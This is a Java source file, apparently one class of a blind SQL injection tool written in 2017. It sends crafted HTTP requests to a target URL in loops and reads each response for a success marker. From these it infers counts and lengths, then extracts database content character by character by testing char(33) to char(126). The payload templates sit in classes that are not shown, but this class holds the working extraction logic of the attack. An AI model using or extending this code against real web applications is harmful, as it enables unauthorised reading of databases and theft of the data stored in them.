/**
 * @ ResultHelper.java
 */
package logic;

import domain.HttpPayload;
import domain.QueryCondition;
import domain.URLCondition;
import domain.UserValueCondition;
import logic.HttpPayloadFactory;
import logic.HttpHelper;

/**
 * <pre>
 * logic.result
 * ResultHelper.java 
 * </pre>
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/08/17
 */
public class ResultHelper {

	private SuccessDecider decider = null;
	private HttpHelper HttpHelper = null;
	private HttpPayloadFactory factory = null;
	
	public ResultHelper() {
		decider = new SuccessDecider();
		HttpHelper = new HttpHelper();
		factory = new HttpPayloadFactory();
	}

	public int getCount(QueryCondition qc, URLCondition uc, UserValueCondition cond){
		return cntWork(qc, uc, cond.getCountUntil(), cond.getMatch());
	}
	
	public int getLength(QueryCondition qc, URLCondition uc, UserValueCondition cond){
		return cntWork(qc, uc, cond.getLengthUntil(), cond.getMatch());
	}
	
	private int cntWork(QueryCondition qc, URLCondition uc, int until, String match){
		int cnt = 0;
		for(int i=0; i < until; i++){
			qc.setCheckVal(i+"");
			HttpPayload bullet = factory.getHttpPayload(qc, uc);
			//System.out.println(bullet.getUrl());
			String res = HttpHelper.send(bullet);
			//System.out.println(res);
			if(decider.isSuccess(res, match)){
				cnt = i;
				break;
			}
		}
		return cnt;
	}
	
	public String getContent(QueryCondition qc, URLCondition uc, UserValueCondition cond, int targetContentLength){
		String content = "";
		for(int i=0; i < targetContentLength ; i++){
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				qc.setDbNameIndex(i+1);  //이 것을 테이블이나 칼럼일 경우 어떻게 할 것인지...
				qc.setCheckVal("char("+j+")");
				HttpPayload bullet = factory.getHttpPayload(qc, uc);
				String res = HttpHelper.send(bullet);
				
				if(decider.isSuccess(res, cond.getMatch())){
					//System.out.println("find !! at : " + j);
					String ascii = Character.toString((char)j);
					content += ascii;
					break;
				}
			}
		}
		return content;
	}
}
